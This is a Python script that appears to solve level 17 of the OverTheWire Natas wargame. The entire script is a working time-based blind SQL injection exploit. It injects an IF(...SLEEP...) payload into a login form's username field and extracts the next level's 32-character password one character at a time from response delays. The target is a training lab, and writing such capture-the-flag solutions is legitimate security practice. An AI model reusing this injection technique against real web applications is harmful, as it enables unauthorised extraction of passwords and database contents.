import requests
from requests.auth import HTTPBasicAuth
import string
import subprocess
import time

key_chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

passw = subprocess.run(['getpass', '17'], stdout=subprocess.PIPE).stdout.decode('utf-8')

sleep_time = 2

select = 'password like binary \''

def build_payload(creds, l):
    time_attack = 'natas18" and IF(' + select + creds + l + '%\', SLEEP(' + str(sleep_time) + '), SLEEP(0)) #'
    data = {'username':time_attack, 'submit':'Check existence'}
    return data

def inject_payload(creds, l):
    payload = build_payload(creds, l)
    requests.post('http://natas17.natas.labs.overthewire.org', auth=HTTPBasicAuth('natas17', passw.strip()), data=payload)

def time_check(creds, c):
    start = time.time()
    inject_payload(creds, key_chars[c])
    end = time.time()
    if end-start >= sleep_time:
        return True
    return False

def solve():
    creds = ''
    while len(creds) < 32:
        c = 0
        while c < len(key_chars):
            #print('+ ' + key_chars[c] + ' | PWD: ' + creds)
            if time_check(creds, c):
                creds += key_chars[c] 
                break
            c += 1

    print(creds)
if __name__ == '__main__':
    solve()
